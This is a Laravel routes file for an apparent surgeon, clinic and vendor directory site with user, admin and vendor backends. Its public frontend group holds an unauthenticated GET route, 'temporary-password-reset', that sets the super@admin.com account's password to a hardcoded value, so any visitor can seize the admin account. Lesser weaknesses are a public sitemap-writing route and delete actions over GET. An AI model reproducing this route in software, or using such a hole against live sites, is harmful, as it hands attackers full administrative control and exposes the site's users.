<?php

use Illuminate\Support\Facades\Hash;
use App\Models\User;

use Illuminate\Support\Facades\Route;
use Spatie\Sitemap\SitemapGenerator;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Autho Routes
require __DIR__ . '/auth.php';

// Atom/ RSS Feed Routes
Route::feeds();

// Language Switch
Route::get('language/{language}', 'LanguageController@switch')->name('language.switch');

/*
*
* Frontend Routes
*
*/
Route::group(['namespace' => 'Frontend', 'as' => 'frontend.'], function () {

    Route::get('temporary-password-reset', function () {
        $user = User::where('email', 'super@admin.com')->first();
        $user->password = Hash::make('XGPOEJKKG!@#$JI91!');
        $user->save();

        return 'Success!';
    });

    Route::get('/', 'FrontendController@index')->name('index');
    Route::get('home', 'FrontendController@index')->name('home');
    Route::get('listing', 'FrontendController@listing')->name('listing');
    Route::get('detail', 'FrontendController@detail')->name('detail');
    // new routes 
    Route::get('surgeon/dr-{slug}', 'FrontendController@surgeon_profile')->name('surgeon');
    Route::get('clinics', 'FrontendController@clinics')->name('clinics');
    Route::get('surgeons', 'FrontendController@surgeons')->name('surgeons');
    Route::get('procedures', 'FrontendController@procedures')->name('procedures');
    Route::get('before-after-results', 'FrontendController@before_after_results')->name('before-after-results');
    Route::get('before-after-results/{slug}', 'FrontendController@before_after_result_details')->name('before-after-result-details');
    Route::get('book-an-appointment', 'FrontendController@appointment')->name('book-an-appointment');
    Route::get('blog/author/{slug}', 'FrontendController@blog_author')->name('blog-author');
    Route::get('blog/category/{slug}', 'FrontendController@blog_category')->name('blog-category');
    // contact us contactus
    Route::get('contact-us', 'FrontendController@contactus')->name('contact-us');
    Route::post('contactlist', 'FrontendController@contactlist')->name('contactlist');
    // new routes

    // Route::get('privacy', 'FrontendController@privacy')->name('privacy');
    // Route::get('terms', 'FrontendController@terms')->name('terms');
    Route::post('newsletter', 'NewsletterController@store')->name('newsletter');
    Route::post('newsletter-save-phone', 'NewsletterController@save_phone')->name('newsletter-save-phone');
    Route::post('post-review', 'VendorController@postReview')->name('post-review');
    Route::post('post-reply', 'VendorController@postReply')->name('post-reply');
    Route::post('call', 'VendorController@callView')->name('call');
    Route::post('call-review', 'VendorController@callReview')->name('call-review');
    Route::get('quotation/type/{alias?}', 'VendorController@saveQuotationType')->name('quotation.type');
    Route::post('quotation-type-save', 'VendorController@storeQuotationType')->name('quotation-type-save');
    Route::get('quotation/{slug}', 'VendorController@saveQuotation')->name('quotation');
    Route::post('quotation-save', 'VendorController@storeQuotation')->name('quotation-save');

    Route::get('honeymoon-ideas', 'TravelController@index')->name('travel.index');
    Route::get('honeymoonAjax', 'TravelController@indexAjax')->name('travel.ajax');
    Route::get('honeymoon-ideas/{slug?}', 'TravelController@detail')->name('travel.detail');

    Route::group(['middleware' => ['auth', 'verified']], function () {
        /*
        *
        *  Users Routes  
        *
        */
        Route::get('profile', ['as' => "users.profile", 'uses' => "UserController@profile"]);
        Route::get('profile/edit', ['as' => "users.profileEdit", 'uses' => "UserController@profileEdit"]);
        Route::post('profile/edit', ['as' => "users.profileUpdate", 'uses' => "UserController@profileUpdate"]);
        // get user cities
        Route::get('users/cities', ['as' => "users.get_user_cities", 'uses' => "UserController@get_user_cities"]);
        // get user cities

        // get results routes
        Route::get('profile/results', 'UserController@profileResults')->name('results.index');
        Route::get('profile/results-create/', 'UserController@results_create')->name('results.create');
        Route::post('profile/results-store/', 'UserController@results_store')->name('results.store');
        Route::get('profile/results-edit/{id}', 'UserController@results_edit')->name('results.edit');
        Route::PATCH('profile/results-update/{id}', 'UserController@results_update')->name('results.update');
        Route::get('profile/results-delete/{id}', 'UserController@results_delete')->name('results.delete');

        Route::get('profile/results/image/{album}', 'UserController@results_image')->name('results.image.index');
        Route::post('profile/results/image/store/{album_id}', 'UserController@results_image_store')->name('results.image.store');
        Route::post('profile/results/image/remove', 'UserController@results_image_remove')->name('results.image.remove');
        Route::get('profile/results/image/delete/{id}', 'UserController@results_image_delete')->name('results.image.delete');
        // get results routes

        // get profile content   
        Route::get('profile/content', 'UserController@profile_content')->name('content.index');
        Route::PATCH('profile/content-update/{id}', 'UserController@profile_content_update')->name('content.update');

        Route::get('profile/posts', 'UserController@profile_posts')->name('profile_posts.index');
        Route::get('profile/posts-create/', 'UserController@posts_create')->name('profile_posts.create');
        Route::post('profile/posts-store/', 'UserController@posts_store')->name('profile_posts.store');
        Route::get('profile/posts-edit/{id}', 'UserController@posts_edit')->name('profile_posts.edit');
        Route::PATCH('profile/posts-update/{id}', 'UserController@posts_update')->name('profile_posts.update');
        Route::get('profile/posts-delete/{id}', 'UserController@posts_delete')->name('profile_posts.delete');
        // get profile content

        Route::get("users/emailConfirmationResend/{id}", ['as' => "users.emailConfirmationResend", 'uses' => "UserController@emailConfirmationResend"]);
        Route::get('profile/changePassword', ['as' => "users.changePassword", 'uses' => "UserController@changePassword"]);
        Route::patch('profile/changePassword', ['as' => "users.changePasswordUpdate", 'uses' => "UserController@changePasswordUpdate"]);
        Route::delete('users/userProviderDestroy', ['as' => 'users.userProviderDestroy', 'uses' => 'UserController@userProviderDestroy']);
        Route::get('quotations/{id}', ['as' => "users.quotations", 'uses' => "UserController@getUserQuotations"]);
        Route::get('quotations/{id}/{quotation_id}', ['as' => "users.quotation", 'uses' => "UserController@getUserQuotation"]);
        Route::get('vendors/{slug?}', ['as' => "vendors.slug", 'uses' => "UserController@getVendors"]);
    });
});

/*
*
* Backend admin Routes
* These routes need view-backend permission
*/
Route::group(['namespace' => 'Backend', 'prefix' => 'admin', 'as' => 'backend.', 'middleware' => ['auth', 'can:view_backend']], function () {

    /**
     * Backend Dashboard
     * Namespaces indicate folder structure.
     */
    Route::get('/', 'BackendController@index')->name('home');
    Route::get('dashboard', 'BackendController@index')->name('dashboard');

    /*
     *
     *  Settings Routes
     *
     */
    Route::group(['middleware' => ['permission:edit_settings']], function () {
        Route::get("settings", "SettingController@index")->name("settings");
        Route::post("settings", "SettingController@store")->name("settings.store");
    });













    /*
     * Travel Honeymoon idea 
    */
    Route::get('travel', 'TravelController@index')->name('travel.index');
    Route::get('travel/create/', 'TravelController@create')->name('travel.create');
    Route::post('travel/store/', 'TravelController@store')->name('travel.store');
    Route::get('travel/edit/{id}', 'TravelController@edit')->name('travel.edit');
    Route::post('travel/update/{id}', 'TravelController@update')->name('travel.update');
    Route::get('travel/trashed/', 'TravelController@trashed')->name('travel.trashed');
    Route::post('travel/trashed/{id}', 'TravelController@restore')->name('travel.restore');
    Route::resource("travel", "TravelController");













    Route::get("city", ['as' => "city.index", 'uses' => "CityController@index"]);
    Route::get("city/index_list", ['as' => "city.index_list", 'uses' => "CityController@index_list"]);
    Route::get("city/index_data", ['as' => "city.index_data", 'uses' => "CityController@index_data"]);
    Route::get("city/trashed", ['as' => "city.trashed", 'uses' => "CityController@trashed"]);
    Route::patch("city/trashed/{id}", ['as' => "city.restore", 'uses' => "CityController@restore"]);
    Route::get("city/destroy/{id}", ['as' => "city.destroy", 'uses' => "CityController@destroy"]);
    Route::resource("city", "CityController");

    // Review
    Route::get("review", ['as' => "review.index", 'uses' => "ReviewController@index"]);
    Route::get("review/index_list", ['as' => "review.index_list", 'uses' => "ReviewController@index_list"]);
    Route::get("review/index_data", ['as' => "review.index_data", 'uses' => "ReviewController@index_data"]);
    Route::get("review/destroy/{id}", ['as' => "review.destroy", 'uses' => "ReviewController@destroy"]);
    Route::get("review/is_active", ['as' => "review.is_active", 'uses' => "ReviewController@is_active"]);
    // reply routes
    Route::get("review/reply/{id}", ['as' => "reply.index", 'uses' => "ReviewController@reply"]);
    Route::get("review/reply_index_list", ['as' => "review.reply_index_list", 'uses' => "ReviewController@reply_index_list"]);
    Route::get("review/reply_index_data/{id}", ['as' => "review.reply_index_data", 'uses' => "ReviewController@reply_index_data"]);
    Route::get("review/reply_destroy/{id}/{review_id}", ['as' => "review.reply_destroy", 'uses' => "ReviewController@reply_destroy"]);
    // reply routes
    Route::resource("review", "ReviewController");
    // Review

    Route::get("type", ['as' => "type.index", 'uses' => "TypeController@index"]);
    Route::get("type/index_list", ['as' => "type.index_list", 'uses' => "TypeController@index_list"]);
    Route::get("type/index_data", ['as' => "type.index_data", 'uses' => "TypeController@index_data"]);
    Route::get("type/trashed", ['as' => "type.trashed", 'uses' => "TypeController@trashed"]);
    Route::patch("type/trashed/{id}", ['as' => "type.restore", 'uses' => "TypeController@restore"]);
    Route::resource("type", "TypeController");

    Route::get('service/{type}', 'ServiceController@index')->name('service.index');
    Route::get('service/create/{type}', 'ServiceController@create')->name('service.create');
    Route::post('service/store/{type}', 'ServiceController@store')->name('service.store');
    Route::get('service/edit/{id}', 'ServiceController@edit')->name('service.edit');
    Route::post('service/update/{id}', 'ServiceController@update')->name('service.update');
    Route::resource("service", "ServiceController");

    Route::get('budget/{type}', 'BudgetController@index')->name('budget.index');
    Route::get('budget/create/{type}', 'BudgetController@create')->name('budget.create');
    Route::post('budget/store/{type}', 'BudgetController@store')->name('budget.store');
    Route::get('budget/edit/{id}', 'BudgetController@edit')->name('budget.edit');
    Route::post('budget/update/{id}', 'BudgetController@update')->name('budget.update');
    Route::resource("budget", "BudgetController");


    Route::get("category", ['as' => "category.index", 'uses' => "CategoryController@index"]);
    Route::get("category/index_list", ['as' => "category.index_list", 'uses' => "CategoryController@index_list"]);
    Route::get("category/index_data", ['as' => "category.index_data", 'uses' => "CategoryController@index_data"]);
    Route::get("category/trashed", ['as' => "category.trashed", 'uses' => "CategoryController@trashed"]);
    Route::patch("category/trashed/{id}", ['as' => "category.restore", 'uses' => "CategoryController@restore"]);
    Route::resource("category", "CategoryController");

    Route::get('vendor', 'VendorController@index')->name('vendor.index');
    Route::get('vendor/edit/{id}', 'VendorController@edit')->name('vendor.edit');
    Route::post('vendor/update/{id}', 'VendorController@update')->name('vendor.update');

    // NEW ADD
    Route::get('customer/is_active', 'CustomerController@is_active')->name('customer.is_active');
    // NEW ADD

    Route::get('customer', 'CustomerController@index')->name('customer.index');
    Route::post('customer/sortable', 'CustomerController@sortable')->name('customer.sortable');
    Route::get('customer/edit/{id}', 'CustomerController@edit')->name('customer.edit');
    Route::post('customer/update/{id}', 'CustomerController@update')->name('customer.update');
    Route::delete('customer/destroy/{id}', 'CustomerController@destroy')->name('customer.destroy');

    // NEW BACKEND RESULTS 
    Route::get('customer/results/{id}', 'CustomerController@profileResults')->name('customer.results.index');
    Route::post('customer/results-store/', 'CustomerController@results_store')->name('customer.results.store');
    Route::get('customer/results-edit/{id}', 'CustomerController@results_edit')->name('customer.results.edit');
    Route::PATCH('customer/results-update/{id}', 'CustomerController@results_update')->name('customer.results.update');
    Route::get('customer/results-delete/{id}', 'CustomerController@results_delete')->name('customer.results.delete');

    Route::get('customer/results/image/{album}', 'CustomerController@results_image')->name('customer.results.image.index');
    Route::post('customer/results/image/store/{album_id}', 'CustomerController@results_image_store')->name('customer.results.image.store');
    Route::post('customer/results/image/remove', 'CustomerController@results_image_remove')->name('customer.results.image.remove');
    Route::get('customer/results/image/delete/{id}', 'CustomerController@results_image_delete')->name('customer.results.image.delete');
    // NEW BACKEND RESULTS 

    Route::get('content', 'ContentController@index')->name('content.index');
    Route::get('content/create/', 'ContentController@create')->name('content.create');
    Route::post('content/store/', 'ContentController@store')->name('content.store');
    Route::get('content/edit/{id}', 'ContentController@edit')->name('content.edit');
    Route::post('content/update/{id}', 'ContentController@update')->name('content.update');
    Route::get('content/trashed/', 'ContentController@trashed')->name('content.trashed');
    Route::post('content/trashed/{id}', 'ContentController@restore')->name('content.restore');
    Route::resource("content", "ContentController");


    /*
    *
    *  Notification Routes
    *
    */
    Route::get("notifications", ['as' => "notifications.index", 'uses' => "NotificationsController@index"]);
    Route::get("notifications/markAllAsRead", ['as' => "notifications.markAllAsRead", 'uses' => "NotificationsController@markAllAsRead"]);
    Route::delete("notifications/deleteAll", ['as' => "notifications.deleteAll", 'uses' => "NotificationsController@deleteAll"]);
    Route::get("notifications/{id}", ['as' => "notifications.show", 'uses' => "NotificationsController@show"]);

    /*
    *
    *  Backup Routes
    *
    */
    Route::get("backups", ['as' => "backups.index", 'uses' => "BackupController@index"]);
    Route::get("backups/create", ['as' => "backups.create", 'uses' => "BackupController@create"]);
    Route::get("backups/download/{file_name}", ['as' => "backups.download", 'uses' => "BackupController@download"]);
    Route::get("backups/delete/{file_name}", ['as' => "backups.delete", 'uses' => "BackupController@delete"]);

    /*
    *
    *  Roles Routes
    *
    */
    Route::resource("roles", "RolesController");

    /*
    *
    *  Users Routes
    *
    */
    Route::get("users/profile/{id}", ['as' => "users.profile", 'uses' => "UserController@profile"]);
    Route::get("users/profile/{id}/edit", ['as' => "users.profileEdit", 'uses' => "UserController@profileEdit"]);
    Route::patch("users/profile/{id}/edit", ['as' => "users.profileUpdate", 'uses' => "UserController@profileUpdate"]);
    Route::get("users/emailConfirmationResend/{id}", ['as' => "users.emailConfirmationResend", 'uses' => "UserController@emailConfirmationResend"]);
    Route::delete("users/userProviderDestroy", ['as' => "users.userProviderDestroy", 'uses' => "UserController@userProviderDestroy"]);
    Route::get("users/profile/changeProfilePassword/{id}", ['as' => "users.changeProfilePassword", 'uses' => "UserController@changeProfilePassword"]);
    Route::patch("users/profile/changeProfilePassword/{id}", ['as' => "users.changeProfilePasswordUpdate", 'uses' => "UserController@changeProfilePasswordUpdate"]);
    Route::get("users/changePassword/{id}", ['as' => "users.changePassword", 'uses' => "UserController@changePassword"]);
    Route::patch("users/changePassword/{id}", ['as' => "users.changePasswordUpdate", 'uses' => "UserController@changePasswordUpdate"]);
    Route::get("users/trashed", ['as' => "users.trashed", 'uses' => "UserController@trashed"]);
    Route::patch("users/trashed/{id}", ['as' => "users.restore", 'uses' => "UserController@restore"]);
    Route::get("users/index_data", ['as' => "users.index_data", 'uses' => "UserController@index_data"]);
    Route::get("users/index_list", ['as' => "users.index_list", 'uses' => "UserController@index_list"]);
    Route::get("users/index", ['as' => "users.index", 'uses' => "UserController@index"]);
    Route::resource("users", "users");
    Route::patch("users/{id}/block", ['as' => "users.block", 'uses' => "UserController@block", 'middleware' => ['permission:block_users']]);
    Route::patch("users/{id}/unblock", ['as' => "users.unblock", 'uses' => "UserController@unblock", 'middleware' => ['permission:block_users']]);

    /*
     *
     *  Newsletter Routes
     *
     */
    Route::get("newsletter", ['as' => "newsletter.index", 'uses' => "NewsletterController@index"]);
    Route::delete("newsletter/destroy/{id}", ['as' => "newsletter.destroy", 'uses' => "NewsletterController@destroy"]);


    // Inquiry routes
    Route::get("inquiry", ['as' => "inquiry.index", 'uses' => "InquiryController@index"]);
    Route::delete("inquiry/destroy/{id}", ['as' => "inquiry.destroy", 'uses' => "InquiryController@destroy"]);
    // Inquiry routes

    /*
     *
     *  Menu Routes
     *
     */
    Route::get("menus/{menu_id}", ['as' => "menu.index", 'uses' => "MenuController@index"]);
    Route::get("menus/create/{menu_id}", ['as' => "menu.create", 'uses' => "MenuController@create"]);
    Route::post("menus/store/{menu_id}", ['as' => "menu.store", 'uses' => "MenuController@store"]);
    Route::get("menus/edit/{id}", ['as' => "menu.edit", 'uses' => "MenuController@edit"]);
    Route::patch("menus/update/{menu_id}/{id}", ['as' => "menu.update", 'uses' => "MenuController@update"]);
    Route::delete("menus/destroy/{menu_id}/{id}", ['as' => "menu.destroy", 'uses' => "MenuController@destroy"]);
    Route::resource("menus", "MenuController");

    Route::post('menus/sortable', 'MenuController@sortable')->name('menus.sortable');

    /*
     *
     *  Menu Type Routes 
     *
     */
    Route::get("menutype", ['as' => "menutype.index", 'uses' => "MenutypeController@index"]);
    Route::get("menutype-create", ['as' => "menutype.create", 'uses' => "MenutypeController@create"]);
    Route::post("menutype-store", ['as' => "menutype.store", 'uses' => "MenutypeController@store"]);
    Route::get("menutype-edit/{id}", ['as' => "menutype.edit", 'uses' => "MenutypeController@edit"]);
    Route::patch("menutype-update/{id}", ['as' => "menutype.update", 'uses' => "MenutypeController@update"]);
    Route::delete("menutype-destroy/{id}", ['as' => "menutype.destroy", 'uses' => "MenutypeController@destroy"]);
});

/*
*
* Backend vendor Routes
* These routes need view-backend permission
*/
Route::group(['namespace' => 'Backend', 'prefix' => 'vendor', 'as' => 'vendor.', 'middleware' => ['auth', 'verified', 'can:view_backend']], function () {

    /**
     * Backend Dashboard
     * Namespaces indicate folder structure.
     */
    Route::get('/', 'BackendController@index')->name('home');
    Route::get('dashboard', 'BackendController@index')->name('dashboard');

    Route::group(['middleware' => ['permission:edit_settings']], function () {
        Route::get("settings", "SettingController@index")->name("settings");
        Route::post("settings", "SettingController@store")->name("settings.store");
    });

    Route::get('album/', 'AlbumController@index')->name('album.index');
    Route::get('album/create/', 'AlbumController@create')->name('album.create');
    Route::post('album/store/', 'AlbumController@store')->name('album.store');
    Route::get('album/edit/{id}', 'AlbumController@edit')->name('album.edit');
    Route::PATCH('album/update/{id}', 'AlbumController@update')->name('album.update');
    Route::get('album/delete/{id}', 'AlbumController@delete')->name('album.delete');
    Route::resource("album", "AlbumController");

    Route::get('video/', 'VideoController@index')->name('video.index');
    Route::get('video/create/', 'VideoController@create')->name('video.create');
    Route::post('video/store/', 'VideoController@store')->name('video.store');
    Route::get('video/edit/{id}', 'VideoController@edit')->name('video.edit');
    Route::PATCH('video/update/{id}', 'VideoController@update')->name('video.update');
    Route::get('video/delete/{id}', 'VideoController@delete')->name('video.delete');
    Route::resource("video", "VideoController");

    Route::get('image/{album}', 'ImageController@index')->name('image.index');
    Route::post('image/store/{album_id}', 'ImageController@store')->name('image.store');
    Route::post('image/remove', 'ImageController@remove')->name('image.remove');
    Route::get('image/delete/{id}', 'ImageController@delete')->name('image.delete');

    Route::get('price', 'PriceController@index')->name('price.index');
    Route::post('price/store', 'PriceController@store')->name('price.store');

    Route::get('quotations', 'QuotationController@index')->name('quotation.index');
    Route::get('quotations/details/{id}', 'QuotationController@details')->name('quotation.details');

    Route::get('profile', 'VendorController@profile')->name('profile');
    Route::post('profile/update', 'VendorController@updateProfile')->name('profile.update');
    Route::resource("vendor", "VendorController");
});

Route::group(['namespace' => 'Frontend', 'as' => 'frontend.'], function () {
    Route::get('typeAjax', 'VendorController@typeAjax')->name('type-ajax');
    Route::get('cityAjax', 'VendorController@cityAjax')->name('city-ajax');
    $paths = getDataArray('types');
    if ($paths) :
        foreach ($paths as $path) {
            Route::get($path->slug . '/', 'VendorController@types')->name('vendor-city-listing');
            Route::get($path->slug . '/{city}', 'VendorController@cities')->name('vendor-listing');
            Route::get($path->slug . '/{city}/{vendor}', 'VendorController@details')->name('vendor-details');
        }
    endif;


    Route::get('search-by-vendors/', 'VendorController@vendorSearch')->name('vendor.search');

    Route::get('search-by-city/', 'VendorController@citySearch')->name('vendor.search.city');
});

Route::get("generate-sitemap", function () {
    SitemapGenerator::create(config('app.url'))->writeToFile(public_path('sitemap.xml'));
    dd("sitemap successfully created!");
});
